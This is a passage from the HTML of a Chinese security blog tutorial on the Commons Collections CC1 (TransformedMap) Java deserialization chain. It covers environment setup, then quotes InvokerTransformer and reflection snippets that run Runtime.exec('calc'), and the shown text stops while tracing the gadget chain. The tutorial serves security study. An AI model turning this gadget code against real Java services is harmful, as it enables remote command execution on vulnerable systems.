@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"sunian19.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="1、Apache Commons Collections包和简介 Apache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection（集合）相关类对象。 以下是Collections的包结构和简单介绍，如果你想了解更多的各个包下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="&#39;Java反序列化-cc1-TransformedMap&#39;">
+<meta property="og:url" content="https://sunian19.github.io/2022/10/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1-TransformedMap/index.html">
+<meta property="og:site_name" content="zer0_c|imb&#39;s blog">
+<meta property="og:description" content="1、Apache Commons Collections包和简介 Apache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection（集合）相关类对象。 以下是Collections的包结构和简单介绍，如果你想了解更多的各个包下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java50.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java49.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java51.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java52.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java56.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java54.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java55.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java57.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java58.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java59.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java60.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java61.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java63.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java65.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java66.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java67.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java68.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java69.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java70.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java71.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java72.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java73.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java74.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java75.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java76.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java77.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java78.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java81.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java82.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java85.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java83.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java62.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java79.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java80.png">
+<meta property="article:published_time" content="2022-10-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-10-12T02:23:24.566Z">
+<meta property="article:author" content="zer0_c|imb">
+<meta property="article:tag" content="java安全系列">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sunian19.github.io/imgss/java50.png">
+
+
+<link rel="canonical" href="https://sunian19.github.io/2022/10/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1-TransformedMap/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://sunian19.github.io/2022/10/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1-TransformedMap/","path":"2022/10/05/Java反序列化-cc1-TransformedMap/","title":"'Java反序列化-cc1-TransformedMap'"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>'Java反序列化-cc1-TransformedMap' | zer0_c|imb's blog</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?48584c486973b4bf025a425c3d7b4007"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">zer0_c|imb's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-apache-commons-collections-bao-he-jian-jie"><span class="nav-number">1.</span> <span class="nav-text">1、Apache Commons Collections包和简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-huan-jing-pei-zhi"><span class="nav-number">2.</span> <span class="nav-text">2、环境配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#shi-yong-jdk-1-8-u-65"><span class="nav-number">2.1.</span> <span class="nav-text">使用jdk：1.8u65</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#an-zhuang-maven"><span class="nav-number">2.2.</span> <span class="nav-text">安装maven</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#idea-she-zhi"><span class="nav-number">2.3.</span> <span class="nav-text">idea设置</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-gong-ji-lian"><span class="nav-number">3.</span> <span class="nav-text">3、攻击链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-xun-zhao-wei-bu-wei-xian-fang-fa-fan-she-dong-tai-jia-zai-zi-jie-ma"><span class="nav-number">3.1.</span> <span class="nav-text">(1)、寻找尾部危险方法(反射&#x2F;动态加载字节码)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-chu-bu-xun-zhao-lian-zi"><span class="nav-number">3.2.</span> <span class="nav-text">(2)、初步寻找链子</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-wan-zheng-lian-zi"><span class="nav-number">3.3.</span> <span class="nav-text">(3)、完整链子</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-zhao-read-object"><span class="nav-number">3.4.</span> <span class="nav-text">(4)、找readObject</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xie-poc"><span class="nav-number">3.5.</span> <span class="nav-text">写poc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wen-ti"><span class="nav-number">3.6.</span> <span class="nav-text">问题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#jie-jue-wen-ti-1"><span class="nav-number">3.7.</span> <span class="nav-text">解决问题1</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ke-neng-yu-dao-de-bao-cuo"><span class="nav-number">4.</span> <span class="nav-text">可能遇到的报错</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-error-java-compilation-failed-internal-java-compiler-error"><span class="nav-number">4.1.</span> <span class="nav-text">1、Error:java: Compilation failed: internal java compiler error</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-lao-wen-ti-zhao-bu-dao-sun-bao"><span class="nav-number">4.2.</span> <span class="nav-text">2、老问题：找不到sun包</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zer0_c|imb"
+      src="/imgss/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">zer0_c|imb</p>
+  <div class="site-description" itemprop="description">忘川河畔彼岸花，红如鲜血似朱砂</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">85</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="mailto:lingyu195@gmail.com" title="E-Mail → mailto:lingyu195@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=3504078815" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;3504078815" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://www.ch4ser.top/" title="http:&#x2F;&#x2F;www.ch4ser.top&#x2F;" rel="noopener" target="_blank">ch4ser</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://hackergu.com/" title="http:&#x2F;&#x2F;hackergu.com&#x2F;" rel="noopener" target="_blank">Gu</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://al0neranger.github.io/" title="https:&#x2F;&#x2F;al0neranger.github.io&#x2F;" rel="noopener" target="_blank">al0neranger</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/lyshark" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;lyshark" rel="noopener" target="_blank">lyshark</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunian19.github.io/2022/10/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1-TransformedMap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/imgss/touxiang.jpg">
+      <meta itemprop="name" content="zer0_c|imb">
+      <meta itemprop="description" content="忘川河畔彼岸花，红如鲜血似朱砂">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zer0_c|imb's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          'Java反序列化-cc1-TransformedMap'
+        </h1>
+
+
+        <div class="post-meta">
+        
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-10-05 00:00:00" itemprop="dateCreated datePublished" datetime="2022-10-05T00:00:00+08:00">2022-10-05</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-10-12 10:23:24" itemprop="dateModified" datetime="2022-10-12T10:23:24+08:00">2022-10-12</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">java安全系列</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="1-apache-commons-collections-bao-he-jian-jie" id="1、Apache-Commons-Collections包和简介">1、Apache Commons Collections包和简介</h3>
+<p>Apache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection（集合）相关类对象。</p>
+<p>以下是Collections的包结构和简单介绍，如果你想了解更多的各个包下的接口和实现，请参考<a target="_blank" rel="noopener" href="http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/index.html">Apache Commons Collections 3.2.2 API文档</a> 。</p>
+<ul>
+<li>org.apache.commons.collections – CommonsCollections自定义的一组公用的接口和工具类</li>
+<li>org.apache.commons.collections.bag – 实现Bag接口的一组类</li>
+<li>org.apache.commons.collections.bidimap – 实现BidiMap系列接口的一组类</li>
+<li>org.apache.commons.collections.buffer – 实现Buffer接口的一组类</li>
+</ul>
+<a id="more"></a>
+<ul>
+<li>org.apache.commons.collections.collection –实现java.util.Collection接口的一组类</li>
+<li>org.apache.commons.collections.comparators– 实现java.util.Comparator接口的一组类</li>
+<li>org.apache.commons.collections.functors –Commons Collections自定义的一组功能类</li>
+<li>org.apache.commons.collections.iterators – 实现java.util.Iterator接口的一组类</li>
+<li>org.apache.commons.collections.keyvalue – 实现集合和键/值映射相关的一组类</li>
+<li>org.apache.commons.collections.list – 实现java.util.List接口的一组类</li>
+<li>org.apache.commons.collections.map – 实现Map系列接口的一组类</li>
+<li>org.apache.commons.collections.set – 实现Set系列接口的一组类</li>
+</ul>
+<p>思路：由于Commons Collections包中都是集合类，并且可以接收任意对象作为参数。</p>
+<h3 id="2-huan-jing-pei-zhi" id="2、环境配置">2、环境配置</h3>
+<h4 id="shi-yong-jdk-1-8-u-65" id="使用jdk：1-8u65">使用jdk：1.8u65</h4>
+<p>8u71之后已修复不可利用</p>
+<h4 id="an-zhuang-maven" id="安装maven">安装maven</h4>
+<p><a target="_blank" rel="noopener" href="https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.zip">https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.zip</a><br>
+配个环境变量<br>
+maven -v 查看maven版本<br>
+<img src="/imgss/java50.png" alt=""></p>
+<h4 id="idea-she-zhi" id="idea设置">idea设置</h4>
+<p>创建个maven项目。<br>
+使用idea-&gt;create new project-&gt;maven。<br>
+<img src="/imgss/java49.png" alt=""></p>
+<p>选中 Project Structure，修改 Modules<br>
+<img src="/imgss/java51.png" alt=""></p>
+<p>选择setting 设置 build --&gt; complier --&gt; java complier 把自己的项目设置version为8。<br>
+<img src="/imgss/java52.png" alt=""></p>
+<p><a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1</a><br>
+复制cc 3.2.1版本的配置，到pom.xml中</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java56.png" alt=""></p>
+<p>配置idea maven build<br>
+<img src="/imgss/java54.png" alt=""></p>
+<p>配置maven settings.xml</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//镜像部分</span></span><br><span class="line">&lt;mirrors&gt;</span><br><span class="line">    &lt;!-- 设置多个镜像只会识别第一个镜像下载 jar 包--&gt;</span><br><span class="line">        &lt;mirror&gt;</span><br><span class="line">            &lt;!-- 该镜像的唯一标识符。id 用来区分不同的 mirror 元素 --&gt;</span><br><span class="line">            &lt;id&gt;aliyunmaven&lt;/id&gt;</span><br><span class="line">            &lt;!-- 被镜像的服务器的 id。如果我们要设置了一个 maven 中央仓库（http:<span class="comment">//repo.maven.apache.org/maven2/）的镜像，就需要将该元素设置成 central。</span></span><br><span class="line">                可以使用 * 表示任意远程库。例如：external:* 表示任何不在 localhost 和文件系统中的远程库，r1,r2 表示 r1 库或者 r2 库，*,!r1 表示除了 r1 库之外的任何远程库 --&gt;</span><br><span class="line">            &lt;mirrorOf&gt;*&lt;/mirrorOf&gt;</span><br><span class="line">            &lt;!-- 镜像名称 --&gt;</span><br><span class="line">            &lt;name&gt;阿里云公共仓库&lt;/name&gt;</span><br><span class="line">            &lt;!-- 镜像的 URL --&gt;</span><br><span class="line">            &lt;url&gt;https:<span class="comment">//maven.aliyun.com/repository/public&lt;/url&gt;</span></span><br><span class="line">        &lt;/mirror&gt;</span><br><span class="line">  &lt;/mirrors&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加本地仓库路径</span></span><br><span class="line">&lt;localRepository&gt;F:\code\repository&lt;/localRepository&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/imgss/java55.png" alt=""></p>
+<p>更新dependencies(reimport)<br>
+<img src="/imgss/java57.png" alt=""></p>
+<p>下载源文件<br>
+<img src="/imgss/java58.png" alt=""></p>
+<p>测试加载类,可正常加载<br>
+import org.apache.commons.collections.functors.InvokerTransformer;</p>
+<p><img src="/imgss/java59.png" alt=""></p>
+<p>我们还要做一件事，修改 sun 包。(java安全-环境,这篇文章中已经说过)</p>
+<p>因为我们打开源码，很多地方的文件是 .class 文件，是已经编译完了的文件，都是反编译代码，我们很难读懂，所以需要把它转换为 .java 文件。</p>
+<p>解压jdk1.8.0_65中的src.zip<br>
+将sun放到src中即可</p>
+<p><a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p>
+<p>src/share/classes/sun<br>
+<img src="/imgss/java60.png" alt=""></p>
+<h3 id="3-gong-ji-lian" id="3、攻击链">3、攻击链</h3>
+<h4 id="1-xun-zhao-wei-bu-wei-xian-fang-fa-fan-she-dong-tai-jia-zai-zi-jie-ma" id="1-、寻找尾部危险方法-反射-动态加载字节码">(1)、寻找尾部危险方法(反射/动态加载字节码)</h4>
+<p>作者是发现了在org.apache.commons.collections.functors包中的Transformer类。<br>
+Transformer类中的Transformer的实现类<br>
+快捷键 crtl alt B<br>
+<img src="/imgss/java61.png" alt=""></p>
+<p>InvokerTransformer类中的transform</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Class cls = input.getClass();</span><br><span class="line">           Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">           <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">               </span><br><span class="line">       &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
+<p>写的非常像后门，getClass加载类，然后getMethod获取方法，invoke反射调用。</p>
+<p>演示一个标准的通过反射调用runtime的方法：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">Class&lt;? extends Runtime&gt; aClass = runtime.getClass();</span><br><span class="line">Method execMethod = aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">execMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java63.png" alt=""></p>
+<p>写成InvokerTransformer类的transform写法。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java65.png" alt=""></p>
+<p>现在我们找到了调用危险方法的地方，所以准备反推</p>
+<h4 id="2-chu-bu-xun-zhao-lian-zi" id="2-、初步寻找链子">(2)、初步寻找链子</h4>
+<p>危险方法(反射/动态加载字节码)(cc1-TransformedMap这里用的是反射) --&gt; InvokerTransformer.transform --&gt; O2.transform(O.aaa) --&gt; A.readObject(O.aaa)</p>
+<p><img src="/imgss/java66.png" alt=""></p>
+<p>Ctrl+Shift+Alt+F7<br>
+设置usages，project and libraries。<br>
+<img src="/imgss/java67.png" alt=""></p>
+<p>例如cc包的map包中LazyMap类调用了transform方法，这时思路如下：<br>
+InvokerTransformer.transform --&gt;LazyMap.transform(O.get) --&gt; A.readObject(O.get)<br>
+<img src="/imgss/java68.png" alt=""></p>
+<p>最终找到<br>
+TransformedMap类中存在checkSetValue()方法调用了transform()方法<br>
+<img src="/imgss/java69.png" alt=""></p>
+<p>接下来我们去看一看valueTransformer.checkSetValue的valueTransformer<br>
+跟进方法<br>
